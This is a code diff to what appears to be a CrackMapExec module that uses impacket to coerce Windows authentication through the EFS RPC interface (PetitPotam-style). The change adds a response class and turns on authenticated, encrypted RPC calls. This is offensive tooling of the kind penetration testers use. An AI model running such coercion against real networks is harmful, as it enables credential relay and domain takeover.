@@ -7,7 +7,7 @@ from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR
-from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.uuid import uuidtup_to_bin
 
 class CMEModule:
@@ -143,12 +143,18 @@ class EfsRpcOpenFileRawResponse(NDRCALL):
         ('hContext', EXIMPORT_CONTEXT_HANDLE),
         ('ErrorCode', ULONG),
     )
+
 class EfsRpcEncryptFileSrv(NDRCALL):
     opnum = 4
     structure = (
         ('FileName', WSTR),
     )
- 
+
+class EfsRpcEncryptFileSrvResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+
 class CoerceAuth():
     def connect(self, username, password, domain, lmhash, nthash, target, pipe, targetIp):
         binding_params = {
@@ -181,8 +187,8 @@ class CoerceAuth():
             rpctransport.setRemoteHost(targetIp)
 
         dce = rpctransport.get_dce_rpc()
-        #dce.set_auth_type(RPC_C_AUTHN_WINNT)
-        #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+        dce.set_auth_type(RPC_C_AUTHN_WINNT)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
         logging.debug("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
         try:
             dce.connect()
@@ -230,4 +236,4 @@ class CoerceAuth():
                         logging.debug("Something went wrong, check error status => %s" % str(e)) 
                 
             else:
-                logging.debug("Something went wrong, check error status => %s" % str(e)) 
+                logging.debug("Something went wrong, check error status => %s" % str(e))
